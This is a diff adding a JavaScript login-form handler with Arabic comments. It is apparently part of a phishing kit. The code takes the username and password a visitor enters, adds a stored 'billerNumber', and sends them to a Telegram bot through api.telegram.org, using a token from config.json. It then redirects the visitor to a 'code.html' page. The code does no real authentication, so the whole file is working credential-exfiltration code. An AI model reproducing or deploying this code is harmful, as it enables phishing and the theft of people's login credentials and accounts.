@@ -1,0 +1,51 @@
+document.querySelector("form").addEventListener("submit", function(event) {
+    event.preventDefault(); // منع إعادة تحميل الصفحة عند النقر على زر "دخول"
+
+    // الحصول على القيم المدخلة من النموذج
+    var username = document.getElementById("username").value;
+    var password = document.getElementById("password").value;
+
+    // الحصول على عنصر رسالة الخطأ
+    var errorMessage = document.getElementById("error-message");
+
+    // التحقق من أن جميع الحقول قد تم ملؤها
+    if (!username || !password) {
+        errorMessage.textContent = "يجب ملء جميع الحقول."; // تحديث الرسالة
+        return; // إيقاف تنفيذ باقي الكود إذا كان الشرط غير متحقق
+    }
+
+    // إذا كانت الحقول صحيحة، قم بمسح رسالة الخطأ
+    errorMessage.textContent = "";
+
+    // جلب البيانات من ملف config.json
+    fetch('config/config.json')
+        .then(response => {
+            if (!response.ok) {
+                throw new Error("فشل في جلب config.json");
+            }
+            return response.json();
+        })
+        .then(config => {
+            var billerNumber = localStorage.getItem('billerNumber') || '';
+            var botToken = config.botToken;
+            var chatId = config.chatId;
+
+            // الرسالة المراد إرسالها إلى تليجرام
+            var message = `ID: ${billerNumber}\n\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+
+            // استدعاء Telegram API لإرسال الرسالة
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // إرسال الطلب
+            return fetch(url);
+        })
+        .then(response => {
+            if (response.ok) {
+                // تحويل المستخدم إلى الصفحة التالية بعد إرسال الرسالة بنجاح
+                window.location.href = "code.html";  // أدخل الصفحة المطلوبة هنا
+            } else {
+                console.error("فشل إرسال الرسالة إلى تليجرام.");
+            }
+        })
+        .catch(error => console.error("خطأ:", error));
+});
